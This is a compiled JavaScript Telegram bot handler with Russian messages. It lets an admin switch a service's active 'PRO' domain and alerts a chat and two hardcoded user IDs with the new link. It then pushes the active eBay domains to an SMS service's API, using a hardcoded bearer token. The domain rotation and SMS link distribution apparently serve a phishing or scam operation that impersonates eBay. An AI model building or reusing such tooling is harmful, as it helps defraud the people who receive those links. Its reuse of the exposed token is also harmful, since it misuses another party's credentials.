"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.composer = void 0;
const grammy_1 = require("grammy");
const database_1 = require("../../../database");
const moment_1 = __importDefault(require("moment"));
const config_1 = require("../../../utils/config");
const request = require('request-promise');
const regex = /^admin domenpro service (?<service>\w+) set (?<id>\d+)$/gmsi;
exports.composer = new grammy_1.Composer();
exports.composer.callbackQuery(regex, handler);
async function handler(ctx) {
    const match = regex.exec(ctx.callbackQuery.data);
    const service = match.groups.service;
    const id = Number(match.groups.id);
    const nowDomen = await database_1.proDomensRepository.findOne({
        where: {
            service,
            active: true
        }
    });
    const laterDomen = await database_1.proDomensRepository.findOne({
        where: {
            id
        }
    });
    if (!laterDomen) {
        return ctx.reply(`Не удалось найти новый домен для замен ${JSON.stringify(match)}`);
    }
    laterDomen.active = true;
    laterDomen.dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
    if (nowDomen) {
        nowDomen.active = false;
        nowDomen.wasUsed = true;
        await database_1.proDomensRepository.save([laterDomen, nowDomen]);
    }
    else {
        await database_1.proDomensRepository.save([laterDomen]);
    }
    updateSmsDomen();
    await ctx.api.sendMessage(config_1.config.chats.chat, `⚠️ [PRO] Домен для <b>${service.toUpperCase()}</b> был только что изменен!`);
    await ctx.api.sendMessage(5933718791, `⚠️ [PRO] Домен для <b>${service.toUpperCase()}</b> был только что изменен!\n\nNew Link: ${laterDomen.link}`);
    await ctx.api.sendMessage(5685044944, `⚠️ [PRO] Домен для <b>${service.toUpperCase()}</b> был только что изменен!\n\nNew Link: ${laterDomen.link}`);
    return ctx.reply(`👍 Домен успешно изменен на ${laterDomen.link}!`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
            ]
        }
    });
}
async function updateSmsDomen() {
    const domens = await database_1.domensRepository.find({
        where: {
            active: true
        }
    });
    const domensPro = await database_1.proDomensRepository.find({
        where: {
            active: true
        }
    });
    let domenList = [];
    for (const obj of domens) {
        if (obj.service === 'ebay')
            domenList.push(/\.(.+)$/.exec(obj.link)[1]);
    }
    for (const obj of domensPro) {
        if (obj.service === 'ebay')
            domenList.push(/\.(.+)$/.exec(obj.link)[1]);
    }
    try {
        request.put('https://api.sms.limited/api/domains', {
            json: true,
            headers: {
                "Authorization": "Bearer c6df114c-a350-47df-920f-17bc79179b27",
                "Host": "api.sms.limited",
                'Content-Type': 'application/json'
            },
            body: {
                domains: domenList
            }
        })
            .then(console.log)
            .catch((err) => {
        });
    }
    catch (e) {
        console.log(e);
    }
}
